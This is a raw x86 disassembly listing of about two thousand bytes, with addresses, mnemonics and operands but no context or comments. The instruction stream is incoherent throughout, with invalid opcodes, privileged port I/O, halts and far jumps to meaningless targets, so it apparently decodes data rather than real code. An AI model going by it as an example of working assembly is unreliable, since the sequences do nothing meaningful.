  41569f:	nop
  4156a0:	cmp    eax,0x30d1e19e
  4156a5:	les    esp,FWORD PTR [edi]
  4156a7:	xchg   DWORD PTR ds:0xa2004b5,ecx
  4156ad:	jae    0x41563e
  4156af:	out    dx,al
  4156b0:	and    al,0x75
  4156b2:	or     al,0xbf
  4156b4:	jle    0x41568d
  4156b6:	and    eax,0x56cd5297
  4156bb:	sti    
  4156bc:	push   0xd0228329
  4156c1:	stos   BYTE PTR es:[edi],al
  4156c2:	pushf  
  4156c3:	inc    ebp
  4156c4:	call   0x9ded:0xe476014d
  4156cb:	push   cs
  4156cc:	dec    ecx
  4156cd:	fadd   QWORD PTR [edx+0x38d6627c]
  4156d3:	push   cs
  4156d4:	stos   BYTE PTR es:[edi],al
  4156d5:	mov    ecx,0xd7531919
  4156da:	push   ecx
  4156db:	mov    BYTE PTR [edi+0x26],cl
  4156de:	outs   dx,DWORD PTR ds:[esi]
  4156df:	arpl   WORD PTR [edx+0x11],ax
  4156e2:	shl    cl,0x1d
  4156e5:	dec    edi
  4156e6:	clc    
  4156e7:	fsubr  DWORD PTR [ecx+esi*2]
  4156ea:	out    dx,al
  4156eb:	dec    edx
  4156ec:	or     ch,BYTE PTR [eax+0x283fae1e]
  4156f2:	and    al,0xcd
  4156f4:	push   DWORD PTR [edx+edx*1-0x42]
  4156f8:	hlt    
  4156f9:	push   esi
  4156fa:	pop    ds
  4156fb:	or     BYTE PTR [edi],ah
  4156fd:	std    
  4156fe:	imul   BYTE PTR [esi+0x1a835e2a]
  415704:	xchg   ebx,eax
  415705:	out    dx,al
  415706:	or     eax,0x9a8a1fc0
  41570b:	in     al,0x19
  41570d:	retf   0xce1b
  415710:	mov    bh,0x9
  415712:	xchg   esi,eax
  415713:	enter  0xf8a0,0x4b
  415717:	cli    
  415718:	xor    ah,dl
  41571a:	pushf  
  41571b:	sbb    edx,DWORD PTR [eax-0x10d429d2]
  415721:	adc    DWORD PTR [esi-0x7530978a],edx
  415727:	adc    BYTE PTR [ecx+eiz*8-0x6b8f44a0],bl
  41572e:	imul   DWORD PTR [edx]
  415730:	push   ss
  415731:	and    DWORD PTR [esi+0x2489b014],edi
  415737:	dec    esp
  415738:	fcmovnbe st,st(2)
  41573a:	pop    es
  41573b:	repnz xor eax,0x96930a8d
  415741:	dec    edx
  415742:	or     al,0x2a
  415744:	mov    DWORD PTR [ebp+0x45],ebx
  415747:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415748:	xor    edx,DWORD PTR ds:0x7b688045
  41574e:	push   edx
  41574f:	mov    ebp,0x4d2dfe15
  415754:	fdiv   DWORD PTR [ebp-0xa399dc4]
  41575a:	mov    eax,ds:0xb95629c
  41575f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415760:	or     ecx,ebx
  415762:	and    esp,DWORD PTR [eax+ecx*4-0x1aa0d374]
  415769:	pusha  
  41576a:	ja     0x415768
  41576c:	pusha  
  41576d:	mov    esp,0xc4ee0c10
  415772:	mul    BYTE PTR [edx-0x7d970b80]
  415778:	rol    dh,cl
  41577a:	(bad)  [edi-0x5fd07fbf]
  415780:	jmp    0x9997:0x5a3df6ef
  415787:	mov    ebp,0xffad2a1a
  41578c:	lods   eax,DWORD PTR ds:[esi]
  41578d:	aam    0x66
  41578f:	push   ds
  415790:	outs   dx,BYTE PTR ds:[esi]
  415791:	push   ecx
  415792:	das    
  415793:	icebp  
  415794:	mov    BYTE PTR [edi],cl
  415796:	pop    esi
  415797:	adc    edx,DWORD PTR [ecx+0x6b]
  41579a:	adc    ch,BYTE PTR [edi-0x1c]
  41579d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41579e:	add    eax,DWORD PTR [eax+0x697d8ad3]
  4157a4:	pushf  
  4157a5:	(bad)  
  4157a6:	repz adc eax,edx
  4157a9:	push   ebp
  4157aa:	fld    TBYTE PTR [eax-0x4c]
  4157ad:	push   edi
  4157ae:	test   DWORD PTR [eax-0x46],0x97cc223d
  4157b5:	jb     0x4157f8
  4157b7:	test   eax,eax
  4157b9:	in     al,0x62
  4157bb:	sahf   
  4157bc:	sar    DWORD PTR ds:0xbedac87e,cl
  4157c2:	adc    al,0x95
  4157c4:	dec    eax
  4157c5:	in     eax,0xd3
  4157c7:	ret    
  4157c8:	cmp    ah,BYTE PTR [esi+edi*8+0x47434901]
  4157cf:	or     DWORD PTR [edi+0xd],0x3e8c0523
  4157d6:	sahf   
  4157d7:	mov    ebx,0xf71eee3c
  4157dc:	pop    ebp
  4157dd:	enter  0x2706,0x7e
  4157e1:	pop    esp
  4157e2:	call   0xc9ba:0x456bffc1
  4157e9:	pop    ds
  4157ea:	ret    0x6c08
  4157ed:	xchg   edx,eax
  4157ee:	xlat   BYTE PTR ds:[ebx]
  4157ef:	mov    es,WORD PTR [ebx+0x3f]
  4157f2:	fnstsw WORD PTR ds:0x3b91e198
  4157f8:	loop   0x415786
  4157fa:	push   ebp
  4157fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157fc:	push   ebp
  4157fd:	in     al,dx
  4157fe:	ss push esp
  415800:	fwait
  415801:	das    
  415802:	rcl    BYTE PTR [ebp+0x4161b92c],1
  415808:	int3   
  415809:	jo     0x4157c3
  41580b:	jbe    0x415826
  41580d:	adc    al,BYTE PTR [edx+0x4bd42262]
  415813:	jge    0x41585a
  415815:	test   al,0xbc
  415817:	or     dh,bl
  415819:	xchg   ecx,eax
  41581a:	test   bh,ah
  41581c:	xchg   esi,eax
  41581d:	push   es
  41581e:	mov    bh,0x48
  415820:	mov    esi,0x61bae882
  415825:	pop    edi
  415826:	push   0x35
  415828:	ja     0x4157b8
  41582a:	xor    BYTE PTR [eax-0x33],0xb
  41582e:	pushf  
  41582f:	int3   
  415830:	pop    eax
  415831:	inc    ebx
  415832:	fyl2x  
  415834:	cld    
  415835:	or     DWORD PTR [ebx],esi
  415837:	add    eax,0x89d0a8d7
  41583c:	adc    BYTE PTR ss:[edx+ebx*2],bh
  415840:	pop    ss
  415841:	xchg   ecx,eax
  415842:	mov    al,BYTE PTR [ebx+eax*4-0x52bf4051]
  415849:	scas   al,BYTE PTR es:[edi]
  41584a:	dec    edi
  41584b:	sbb    al,0x76
  41584d:	sub    BYTE PTR [eax],bh
  41584f:	(bad)  
  415852:	cmp    DWORD PTR [edx+0x66],esi
  415855:	stos   BYTE PTR es:[edi],al
  415856:	jns    0x4157e6
  415858:	out    0x75,eax
  41585a:	and    BYTE PTR [eax+0x56],ah
  41585d:	fwait
  41585e:	repz sub al,BYTE PTR [ecx+0x1b64ddd3]
  415865:	mov    bh,0x95
  415867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415868:	sbb    eax,ebx
  41586a:	jge    0x41588f
  41586c:	leave  
  41586d:	mov    bh,0xf1
  41586f:	cmp    al,0x60
  415871:	and    eax,0xff54d502
  415876:	sbb    cl,BYTE PTR ds:0x91c88478
  41587c:	xchg   edi,eax
  41587d:	test   BYTE PTR [eax+0x3992616d],dl
  415883:	push   ss
  415884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415885:	pop    ebx
  415886:	dec    ebp
  415887:	and    bl,BYTE PTR [eax+0x5e]
  41588a:	inc    esp
  41588b:	push   ds
  41588c:	loop   0x415853
  41588e:	pop    edi
  41588f:	rdtsc  
  415891:	out    dx,eax
  415892:	push   cs
  415893:	fbld   TBYTE PTR ds:0x1a50a2aa
  415899:	cmp    edx,DWORD PTR [ebx+0x7d]
  41589c:	inc    esi
  41589d:	cmp    edx,DWORD PTR [edi-0x1]
  4158a0:	adc    al,0x65
  4158a2:	lahf   
  4158a3:	pop    ecx
  4158a4:	fmul   QWORD PTR [esi-0x1d0ed7c]
  4158aa:	xchg   DWORD PTR [esi-0x7e1e0322],ebx
  4158b0:	dec    eax
  4158b1:	out    dx,al
  4158b2:	add    BYTE PTR [edi-0x21],0x73
  4158b6:	add    dh,BYTE PTR ds:0xe0f92d41
  4158bc:	push   eax
  4158bd:	add    eax,0x373313ec
  4158c2:	mov    DWORD PTR [edi+0x3cc010e0],esi
  4158c8:	mov    esi,0xbf9cbb2b
  4158cd:	push   0xd2a94391
  4158d2:	sub    DWORD PTR [edx],ecx
  4158d4:	int    0x6b
  4158d6:	mov    bh,0x3
  4158d8:	enter  0x7d2d,0xa1
  4158dc:	ins    BYTE PTR es:[edi],dx
  4158dd:	mov    WORD PTR [ebx+eiz*1],?
  4158e0:	lock cld 
  4158e2:	sar    DWORD PTR ds:0x6f8de84a,cl
  4158e8:	mov    esi,0xa7df9b9
  4158ed:	jns    0x415931
  4158ef:	outs   dx,BYTE PTR ds:[esi]
  4158f0:	call   0x2307:0xd0d7f4c1
  4158f7:	adc    al,0x9b
  4158f9:	call   DWORD PTR [esi+edi*8+0x7525c9ff]
  415900:	push   0xc41908f1
  415905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415906:	pop    edx
  415907:	imul   edx,esp,0x9bc7a660
  41590d:	call   DWORD PTR [ecx+0x25758e0b]
  415913:	loopne 0x415939
  415915:	ds ffreep st(3)
  415918:	xchg   edx,eax
  415919:	sbb    ebp,DWORD PTR [edi+0x2884484b]
  41591f:	adc    BYTE PTR [esi-0x69],0x48
  415923:	pop    ds
  415924:	scas   al,BYTE PTR es:[edi]
  415925:	push   esi
  415926:	enter  0x2cdc,0xba
  41592a:	mov    edi,0x81491e24
  41592f:	adc    eax,0x97581cf5
  415934:	mov    al,ds:0xf63b3f29
  415939:	xchg   edx,eax
  41593a:	ret    
  41593b:	dec    eax
  41593c:	outs   dx,DWORD PTR ds:[esi]
  41593d:	pop    ecx
  41593e:	loop   0x4159a7
  415940:	popa   
  415941:	mov    ebx,0xfe8d5a49
  415946:	jne    0x4158eb
  415948:	pop    edx
  415949:	cmp    bh,BYTE PTR [eax]
  41594b:	sbb    edx,DWORD PTR [eax-0x13]
  41594e:	out    0x56,al
  415950:	sub    DWORD PTR [edi+0x3],ebp
  415953:	cmp    BYTE PTR [edi+edi*8+0x60],0x47
  415958:	and    cl,al
  41595a:	jnp    0x4159a4
  41595c:	xchg   ebx,eax
  41595d:	pop    edi
  41595e:	xchg   esp,eax
  41595f:	dec    esi
  415960:	into   
  415961:	pop    edi
  415962:	addr16 dec esi
  415964:	into   
  415965:	outs   dx,BYTE PTR ds:[esi]
  415966:	jno    0x415943
  415968:	push   eax
  415969:	idiv   esi
  41596b:	loop   0x415940
  41596d:	mov    dl,al
  41596f:	xchg   edx,eax
  415970:	sbb    cl,cl
  415972:	jp     0x4159c6
  415974:	shl    DWORD PTR [eax],cl
  415976:	std    
  415977:	pop    ebp
  415978:	jle    0x41590c
  41597a:	rol    DWORD PTR [ebx-0x59],1
  41597d:	push   edi
  41597e:	fisub  WORD PTR [esp+edx*8+0x4b]
  415982:	stc    
  415983:	xchg   esp,eax
  415984:	jmp    0x3eaaf64d
  415989:	test   al,0xbc
  41598b:	(bad)  
  41598c:	sub    eax,0x1f770ef1
  415991:	push   esp
  415992:	jbe    0x415949
  415994:	je     0x415970
  415996:	scas   eax,DWORD PTR es:[edi]
  415997:	out    dx,eax
  415998:	sbb    eax,0x3994156d
  41599d:	out    dx,eax
  41599e:	pop    edx
  41599f:	sub    DWORD PTR [edi],ecx
  4159a1:	dec    esp
  4159a2:	mov    ds:0x97c8aac1,al
  4159a7:	aas    
  4159a8:	add    DWORD PTR [eax+0x61c8ec4e],ecx
  4159ae:	lea    ecx,[ecx+0x30]
  4159b1:	dec    edi
  4159b2:	fist   WORD PTR [edi-0x2a]
  4159b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159b6:	(bad)  
  4159b7:	out    dx,al
  4159b8:	(bad)  
  4159b9:	stc    
  4159ba:	outs   dx,DWORD PTR ds:[esi]
  4159bb:	pop    eax
  4159bc:	or     al,ch
  4159be:	es xchg edi,eax
  4159c0:	leave  
  4159c1:	sbb    cl,BYTE PTR [esi-0x17a601e9]
  4159c7:	pop    eax
  4159c8:	stc    
  4159c9:	es and edi,edi
  4159cc:	and    eax,0x2df78140
  4159d1:	add    DWORD PTR [ecx-0x4f2deea8],ebp
  4159d7:	xchg   esp,eax
  4159d8:	adc    ch,BYTE PTR [edx+0x3d]
  4159db:	sahf   
  4159dc:	and    ah,ch
  4159de:	add    DWORD PTR [ebx+0x5338c316],eax
  4159e4:	imul   ebp,DWORD PTR [eax+ebx*1-0x602f9e7a],0x1f
  4159ec:	dec    eax
  4159ed:	ds clc 
  4159ef:	sbb    bh,cl
  4159f1:	jmp    0xd2aefe58
  4159f6:	popa   
  4159f7:	ret    
  4159f8:	ss (bad) 
  4159fa:	and    eax,0xbf4feceb
  4159ff:	mov    ah,0x99
  415a01:	or     ah,dh
  415a03:	pop    edi
  415a04:	xchg   DWORD PTR [ecx+0x50ae1ce4],edi
  415a0a:	call   0xa91a:0xab35cf2c
  415a11:	adc    DWORD PTR [edx+0x65f84342],esi
  415a17:	das    
  415a18:	inc    ecx
  415a19:	push   es
  415a1a:	jnp    0x415a55
  415a1c:	fst    DWORD PTR [ebx+esi*4-0x21]
  415a20:	shr    BYTE PTR [eax+0x67],cl
  415a23:	stos   BYTE PTR es:[edi],al
  415a24:	lods   al,BYTE PTR ds:[esi]
  415a25:	imul   edx,DWORD PTR [esi],0x4d
  415a28:	daa    
  415a29:	jbe    0x415a7f
  415a2b:	sub    al,BYTE PTR [ecx]
  415a2d:	push   ds
  415a2e:	pop    edx
  415a2f:	pop    ebx
  415a30:	mov    eax,0x3af4134c
  415a35:	xchg   esp,esp
  415a37:	xlat   BYTE PTR ds:[ebx]
  415a38:	in     eax,dx
  415a39:	adc    esp,ebx
  415a3b:	mov    eax,ds:0x7cc0a1ac
  415a40:	icebp  
  415a41:	mov    WORD PTR [edi],?
  415a43:	xor    eax,0xd45cec1a
  415a48:	stc    
  415a49:	pop    eax
  415a4a:	mov    eax,0xc2a2cca9
  415a4f:	mov    edi,0x1ea1b6d3
  415a54:	rol    BYTE PTR [edi-0x57b06f44],1
  415a5a:	(bad)
  415a5d:	pop    es
  415a5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a5f:	or     BYTE PTR [edi],0x26
  415a62:	sbb    al,dl
  415a64:	adc    edx,DWORD PTR [ebx]
  415a66:	in     al,0xde
  415a68:	pop    es
  415a69:	fs fxch st(4)
  415a6c:	sar    bl,1
  415a6e:	mov    BYTE PTR [edx+0x385e3daa],ch
  415a74:	sub    al,0xb4
  415a76:	scas   al,BYTE PTR es:[edi]
  415a77:	or     esp,DWORD PTR [ebx+0x1d2c397b]
  415a7d:	scas   al,BYTE PTR es:[edi]
  415a7e:	xchg   ecx,eax
  415a7f:	cs aad 0x49
  415a82:	ret    
  415a83:	test   BYTE PTR [edx],dl
  415a85:	sti    
  415a86:	mov    ah,0x8a
  415a88:	sub    al,0xfd
  415a8a:	fistp  QWORD PTR [esi]
  415a8c:	fmul   DWORD PTR [eax-0x74edcb0a]
  415a92:	mov    esp,0xe04355a7
  415a97:	jge    0x415aa0
  415a99:	push   ebx
  415a9a:	push   esp
  415a9b:	jmp    0x7f796736
  415aa0:	or     dh,BYTE PTR [eax]
  415aa2:	dec    ebx
  415aa3:	pop    es
  415aa4:	pushf  
  415aa5:	arpl   WORD PTR [ecx+0x11],bp
  415aa8:	(bad)  
  415aa9:	xor    al,0x1c
  415aab:	push   edx
  415aac:	lahf   
  415aad:	dec    edx
  415aae:	jmp    0x5253:0x97a6a7cc
  415ab5:	hlt    
  415ab6:	out    0x38,eax
  415ab8:	jmp    0x415b28
  415aba:	and    cl,al
  415abc:	dec    ebp
  415abd:	call   0xda9c559d
  415ac2:	aaa    
  415ac3:	jae    0x415aeb
  415ac5:	pusha  
  415ac6:	(bad)  
  415ac7:	mov    bl,0xbf
  415ac9:	ds add al,0xc4
  415acc:	je     0x415b45
  415ace:	out    0x9e,eax
  415ad0:	shl    ah,cl
  415ad2:	rcr    DWORD PTR [edx+0x34],0xd5
  415ad6:	jmp    0xfa5:0x80976850
  415add:	push   0xffffffb8
  415adf:	push   eax
  415ae0:	adc    DWORD PTR es:[edi],0x17ed561d
  415ae7:	jmp    0x415ae7
  415ae9:	jmp    0x6534cb46
  415aee:	or     DWORD PTR [eax-0x7a],esp
  415af1:	hlt    
  415af2:	loope  0x415aec
  415af4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415af5:	cmp    DWORD PTR [edx],0x55
  415af8:	scas   al,BYTE PTR es:[edi]
  415af9:	sbb    eax,DWORD PTR [ebp-0x1f]
  415afc:	fldcw  WORD PTR [ecx+0x21fef114]
  415b02:	jnp    0x415a8c
  415b04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b05:	aam    0x83
  415b07:	aad    0x3c
  415b09:	in     al,0x52
  415b0b:	sub    ebp,0x6ce20db0
  415b11:	and    al,0xdc
  415b13:	mov    bh,0x63
  415b15:	push   es
  415b16:	out    dx,al
  415b17:	jmp    0xfc75:0xbc19b57d
  415b1e:	cli    
  415b1f:	(bad)
  415b22:	push   esi
  415b23:	xlat   BYTE PTR ds:[ebx]
  415b24:	aad    0x79
  415b26:	push   0x2
  415b28:	push   cs
  415b29:	(bad)  
  415b2a:	mov    esi,ss
  415b2c:	leave  
  415b2d:	pusha  
  415b2e:	pop    edx
  415b2f:	inc    edx
  415b30:	sbb    eax,0xbbec370e
  415b35:	mov    al,0x92
  415b37:	sub    edi,esi
  415b39:	mov    bl,0x93
  415b3b:	mov    DWORD PTR [edx],esi
  415b3d:	mov    DWORD PTR [edi],0x683e7426
  415b43:	call   0x93ff68cd
  415b48:	fmul   QWORD PTR [edx+0x1d]
  415b4b:	popf   
  415b4c:	xchg   ecx,eax
  415b4d:	cmp    eax,0x629115a5
  415b52:	pop    ebx
  415b53:	sub    BYTE PTR ds:0x81559d42,cl
  415b59:	mov    edx,esi
  415b5b:	nop
  415b5c:	dec    edi
  415b5d:	lea    esi,[ebp-0x4b7da6d5]
  415b63:	stc    
  415b64:	mov    ch,0x1a
  415b66:	or     ebp,esp
  415b68:	mov    bl,0x55
  415b6a:	mov    BYTE PTR [edi],al
  415b6c:	leave  
  415b6d:	push   ecx
  415b6e:	jmp    0x7df4833d
  415b73:	add    al,0x69
  415b75:	sar    edi,cl
  415b77:	xchg   DWORD PTR ds:0x118847a5,eax
  415b7d:	test   DWORD PTR [eax],edi
  415b7f:	add    al,0x89
  415b81:	mov    eax,ds:0x24eb56a2
  415b86:	dec    esi
  415b87:	cmp    BYTE PTR [ebp+0x7862c8d4],ah
  415b8d:	inc    esp
  415b8e:	scas   eax,DWORD PTR es:[edi]
  415b8f:	and    ebp,ebp
  415b91:	ror    BYTE PTR [edx],1
  415b93:	mov    bl,0x79
  415b95:	into   
  415b96:	inc    eax
  415b97:	lods   al,BYTE PTR ds:[esi]
  415b98:	sbb    al,0x18
  415b9a:	fdivr  DWORD PTR [ecx-0x2e]
  415b9d:	jg     0x415ba5
  415b9f:	cmp    BYTE PTR [eax],dh
  415ba1:	addr16 leave 
  415ba3:	pusha  
  415ba4:	fisttp QWORD PTR [edi+0x270e7dad]
  415baa:	dec    eax
  415bab:	sub    DWORD PTR ds:0xcef9836e,0x31
  415bb2:	jbe    0x415c20
  415bb4:	cs popa 
  415bb6:	(bad)  
  415bb7:	test   BYTE PTR [eax+0x66f79f9d],ah
  415bbd:	jmp    0x6bceb46
  415bc2:	sub    ch,BYTE PTR [ebx+0x370274ca]
  415bc8:	pop    ebp
  415bc9:	push   esp
  415bca:	not    ebx
  415bcc:	pop    eax
  415bcd:	lds    eax,FWORD PTR [eax+0x39]
  415bd0:	imul   BYTE PTR [ecx+0x1842e3d8]
  415bd6:	cli    
  415bd7:	jge    0x415bed
  415bd9:	inc    ebx
  415bda:	mov    ebp,0x657d0fd2
  415bdf:	fdivr  QWORD PTR [ebx+edi*4+0x1c]
  415be3:	int    0x5a
  415be5:	jl     0x415c65
  415be7:	mov    ds:0xdb1b8076,eax
  415bec:	arpl   WORD PTR [esi],sp
  415bee:	gs push ss
  415bf0:	xchg   esi,eax
  415bf1:	loope  0x415b9c
  415bf3:	cmp    eax,0xfb1bc18d
  415bf8:	mov    dh,0xb3
  415bfa:	clc    
  415bfb:	cmp    al,0x6a
  415bfd:	xchg   ebx,eax
  415bfe:	stos   DWORD PTR es:[edi],eax
  415bff:	adc    al,0x4b
  415c01:	and    al,ch
  415c03:	sbb    bl,bh
  415c05:	xchg   DWORD PTR [edx+ecx*8+0xf],ecx
  415c09:	imul   esp,DWORD PTR [ebx+0x2d],0x31210e01
  415c10:	mov    gs,WORD PTR [ebx+0x22]
  415c13:	rcl    BYTE PTR [edx],0xe4
  415c16:	into   
  415c17:	stos   DWORD PTR es:[edi],eax
  415c18:	jmp    0x415c6a
  415c1a:	inc    ebx
  415c1b:	and    BYTE PTR [eax-0x2a],ah
  415c1e:	(bad)  
  415c1f:	into   
  415c20:	pop    ds
  415c21:	mov    eax,0xcfa8c7fd
  415c26:	jno    0x415c8b
  415c28:	imul   eax,esi,0x8
  415c2b:	push   esi
  415c2c:	aaa    
  415c2d:	dec    esp
  415c2e:	fcmove st,st(4)
  415c30:	mov    eax,ds:0xbeff2044
  415c35:	mov    ds:0x256134a1,al
  415c3a:	ss cdq 
  415c3c:	inc    ebp
  415c3d:	fisub  DWORD PTR [esi-0x55]
  415c40:	cmp    dh,BYTE PTR es:[esi+0x9f916ed]
  415c47:	add    DWORD PTR [ebp-0x62f7a679],esi
  415c4d:	jbe    0x415caa
  415c4f:	repnz sar al,cl
  415c52:	pop    ecx
  415c53:	and    eax,0x4f516f50
  415c58:	xchg   DWORD PTR [eax-0x50b2729f],esp
  415c5e:	mov    eax,ds:0xb583c704
  415c63:	jbe    0x415cc1
  415c65:	outs   dx,BYTE PTR ds:[esi]
  415c66:	(bad)  
  415c67:	pushf  
  415c68:	lea    ebp,[edi]
  415c6a:	rcl    ch,1
  415c6c:	mov    al,ds:0x1a37682e
  415c71:	fwait
  415c72:	pop    ebx
  415c73:	adc    edx,DWORD PTR [ecx]
  415c75:	inc    esp
  415c76:	cld    
  415c77:	pop    ss
  415c78:	es mov ah,0xfe
  415c7b:	outs   dx,DWORD PTR ds:[esi]
  415c7c:	push   esi
  415c7d:	push   ecx
  415c7e:	sbb    dl,bh
  415c80:	add    DWORD PTR [edx-0x2fa49159],esp
  415c86:	add    cl,BYTE PTR [edi+0x69]
  415c89:	pop    esp
  415c8a:	scas   eax,DWORD PTR es:[edi]
  415c8b:	sub    ecx,edx
  415c8d:	or     eax,0xca6a64ee
  415c92:	mov    ch,0xef
  415c94:	mov    ch,0x52
  415c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c97:	test   BYTE PTR [ebx-0xb],al
  415c9a:	pop    ebp
  415c9b:	mov    edx,0xeeaf6b08
  415ca0:	pop    edx
  415ca1:	call   0x6ac5b45
  415ca6:	inc    ecx
  415ca7:	push   esp
  415ca8:	in     al,0x1c
  415caa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cab:	xor    esp,DWORD PTR ds:0xd5a7dc1f
  415cb1:	push   edi
  415cb2:	mov    DWORD PTR [eax],0x7947afb
  415cb8:	sub    bh,dl
  415cba:	out    0x37,eax
  415cbc:	repz and bh,BYTE PTR [eax+0x396e6f50]
  415cc3:	add    eax,0x88cdbdc7
  415cc8:	jno    0x415d41
  415cca:	sbb    edi,0xff3dae42
  415cd0:	jmp    0x415d2e
  415cd2:	push   eax
  415cd3:	hlt    
  415cd4:	and    ecx,DWORD PTR [ecx]
  415cd6:	adc    ebp,DWORD PTR [esi]
  415cd8:	mov    al,0xdb
  415cda:	adc    DWORD PTR [edi-0x36],edi
  415cdd:	mov    edi,0x4fd97c74
  415ce2:	aaa    
  415ce3:	ret    
  415ce4:	push   eax
  415ce5:	push   ecx
  415ce6:	retf   0xb776
  415ce9:	(bad)  
  415cea:	cmp    ecx,eax
  415cec:	xor    eax,0x5b46890e
  415cf1:	sub    DWORD PTR [eax+0x56],ebp
  415cf4:	(bad)  
  415cf5:	or     eax,0x94418e46
  415cfa:	or     al,0x73
  415cfc:	jno    0x415ccf
  415cfe:	enter  0xae42,0x91
  415d02:	outs   dx,DWORD PTR ds:[esi]
  415d03:	loop   0x415d3a
  415d05:	ret    0x481b
  415d08:	les    ecx,FWORD PTR [edx]
  415d0a:	test   DWORD PTR [edi-0x4d],ecx
  415d0d:	xchg   esi,eax
  415d0e:	cmp    eax,0xf62a39a6
  415d13:	mov    dl,0xa4
  415d15:	and    DWORD PTR [edi-0x7d],esi
  415d18:	mov    ebx,DWORD PTR [esp+ecx*1-0x57]
  415d1c:	push   ebx
  415d1d:	push   ebp
  415d1e:	iret   
  415d1f:	fs ins DWORD PTR es:[edi],dx
  415d21:	cmp    DWORD PTR [esp+ecx*1+0x79],0xffffffb6
  415d26:	inc    bx
  415d28:	inc    esp
  415d29:	mov    al,ds:0xa60c89b3
  415d2e:	fnstenv [ecx+0x520dc255]
  415d34:	mov    WORD PTR [ebx+eax*8+0x7f15fb4a],ds
  415d3b:	sahf   
  415d3c:	push   es
  415d3d:	icebp  
  415d3e:	push   edx
  415d3f:	mov    al,ds:0xcad68154
  415d44:	push   ebx
  415d45:	ins    DWORD PTR es:[edi],dx
  415d46:	jno    0x415da0
  415d48:	sbb    ch,cl
  415d4a:	stos   DWORD PTR es:[edi],eax
  415d4b:	add    bl,bh
  415d4d:	(bad)  
  415d4e:	mov    eax,edx
  415d50:	lods   al,BYTE PTR ds:[esi]
  415d51:	sbb    ecx,0x6e356505
  415d57:	or     DWORD PTR ds:0x60c106d7,ebp
  415d5d:	out    dx,eax
  415d5e:	imul   edi,DWORD PTR [ebx-0x5b3af583],0xffffffdc
  415d65:	lds    esp,FWORD PTR [edi-0x2d]
  415d68:	dec    eax
  415d69:	test   al,0x68
  415d6b:	push   esp
  415d6c:	cmc    
  415d6d:	xchg   esi,eax
  415d6e:	cwde   
  415d6f:	xor    DWORD PTR [eax],esi
  415d71:	push   eax
  415d72:	jne    0x415d02
  415d74:	cmovb  ecx,DWORD PTR [ebp-0x6c]
  415d78:	(bad)  
  415d79:	mov    bh,0xa2
  415d7b:	lods   eax,DWORD PTR ds:[esi]
  415d7c:	mov    esp,0xcc139bfd
  415d81:	and    eax,0x2756aa5
  415d86:	mul    BYTE PTR [edi+esi*1+0x17a59d0b]
  415d8d:	and    ecx,DWORD PTR [esi+0x61]
  415d90:	xchg   ebp,eax
  415d91:	sub    al,0x6
  415d93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d94:	je     0x415d4d
  415d96:	cmp    al,0x27
  415d98:	and    eax,0x59a4a1c
  415d9d:	nop
  415d9e:	mov    edi,0x3493d221
  415da3:	jne    0x415dd9
  415da5:	in     eax,dx
  415da6:	jmp    0x415de2
  415da8:	ror    BYTE PTR [ebx+eax*8+0x1d249803],0x78
  415db0:	out    0x19,eax
  415db2:	stc    
  415db3:	and    BYTE PTR gs:[edi],ch
  415db6:	mov    dh,BYTE PTR [edi+edi*1+0x2fcae80a]
  415dbd:	sbb    eax,0x625fdd8e
  415dc2:	sub    ebx,0xffffffe4
  415dc5:	ins    DWORD PTR es:[edi],dx
  415dc6:	or     ebp,edi
  415dc8:	pusha  
  415dc9:	mov    esi,0x3eb111e
  415dce:	xchg   edx,eax
  415dcf:	popf   
  415dd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dd1:	dec    esp
  415dd2:	pushf  
  415dd3:	stos   BYTE PTR es:[edi],al
  415dd4:	pusha  
  415dd5:	xchg   DWORD PTR [ebp+0x7c],esi
  415dd8:	outs   dx,DWORD PTR ds:[esi]
  415dd9:	mov    eax,ds:0xa382f3d5
  415dde:	mov    eax,ds:0x2dafc982
  415de3:	xlat   BYTE PTR ds:[ebx]
  415de4:	push   ebx
  415de5:	sti    
  415de6:	jle    0x415dba
  415de8:	xor    ah,BYTE PTR [eax+0x46]
  415deb:	xchg   edi,eax
  415dec:	cwde   
  415ded:	jbe    0x415dee
  415def:	jb     0x415db6
  415df1:	jle    0x415dfd
  415df3:	out    dx,eax
  415df4:	sbb    DWORD PTR [eax-0x78dd40c4],esp
  415dfa:	jae    0x415e5f
  415dfc:	jb     0x415e1f
  415dfe:	aam    0x3c
  415e00:	or     BYTE PTR [ebx+ebx*8],0x2f
  415e04:	(bad)  
  415e06:	out    0x45,al
  415e08:	jo     0x415e6c
  415e0a:	test   BYTE PTR [eax+eax*4+0x51],bh
  415e0e:	mov    edi,0x8f9de714
  415e13:	out    0x3c,al
  415e15:	(bad)  
  415e16:	std    
  415e17:	loop   0x415e28
  415e19:	int3   
  415e1a:	into   
  415e1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e1c:	sbb    bl,BYTE PTR [eax-0x1c87332a]
  415e22:	inc    edx
  415e23:	popf   
  415e24:	out    0x19,eax
  415e26:	movsx  esp,di
  415e29:	mov    ebp,0x1e26b501
  415e2e:	jns    0x415e25
  415e30:	mov    edi,0x91d4465e
  415e35:	add    al,0x2b
  415e37:	jg     0x415eb6
  415e39:	dec    edi
  415e3a:	and    al,0xe8
  415e3c:	jno    0x415e96
  415e3e:	shl    BYTE PTR [eax],1
  415e40:	mov    al,0x14
  415e42:	(bad)  
  415e43:	xchg   esp,eax
  415e44:	outs   dx,BYTE PTR ds:[esi]
  415e45:	cld    
  415e46:	push   cs
  415e47:	ffree  st(5)
  415e49:	sub    DWORD PTR cs:[ebx-0x8cc9868],ecx
  415e50:	inc    ecx
  415e51:	cwde   
  415e52:	cli    
  415e53:	push   ds
  415e54:	icebp  
  415e55:	push   ss
  415e56:	jo     0x415e0b
